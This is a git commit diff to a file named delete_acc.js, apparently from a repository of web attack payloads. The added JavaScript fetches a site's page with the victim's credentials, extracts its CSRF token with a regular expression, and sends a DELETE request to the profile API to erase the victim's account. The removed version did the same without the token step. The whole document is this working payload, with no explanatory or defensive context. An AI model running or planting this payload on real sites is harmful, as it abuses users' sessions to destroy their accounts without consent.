021e505c7ae2f1fc79ef2cbaa3ce6c67e30abcfc
bbpa <57352896+bbpa@users.noreply.github.com>
2026-06-23 03:15:20 +0330

    Update delete_acc.js

--- delete_acc.js
+++ delete_acc.js
@@ -1,9 +1,13 @@
-const xhr = new XMLHttpRequest();
-xhr.open('DELETE', '/user/api/internal/profile', true);
-xhr.withCredentials = true;
-
-xhr.onload = function () {
-  alert('Your Account Deleted');
+var x = new XMLHttpRequest();
+x.open('GET', '/');
+x.withCredentials = true;
+x.onload = function() {
+  var csrf = x.responseText.match(/window\.csrfToken\s*=\s*["']([^"']+)["']/)[1];
+  var d = new XMLHttpRequest();
+  d.open('DELETE', '/api/profile');
+  d.withCredentials = true;
+  d.setRequestHeader('X-Csrf-Token', csrf);
+  d.onload = function() { alert('Your Account Deleted'); };
+  d.send();
 };
-
-xhr.send();
+x.send();
